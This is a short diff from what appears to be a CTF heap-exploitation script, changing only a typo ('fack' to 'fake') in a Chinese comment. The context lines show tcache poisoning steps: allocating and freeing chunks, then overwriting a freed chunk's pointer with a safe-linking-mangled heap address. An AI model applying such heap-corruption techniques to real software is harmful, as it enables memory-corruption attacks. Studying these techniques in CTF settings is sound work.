@@ -61,7 +61,7 @@ add(3, p64(0x07))  # 0xa0 tcache->7
 
 add(4, "4"*10)
 add(5, "5"*10)
-add(19, "19"*10)  # 防止下面fack chunk(0xa0)合并
+add(19, "19"*10)  # 防止下面fake chunk(0xa0)合并
 delete(4)
 delete(5)
 update(5, p64((heap+0x300) ^ heap >> 12))
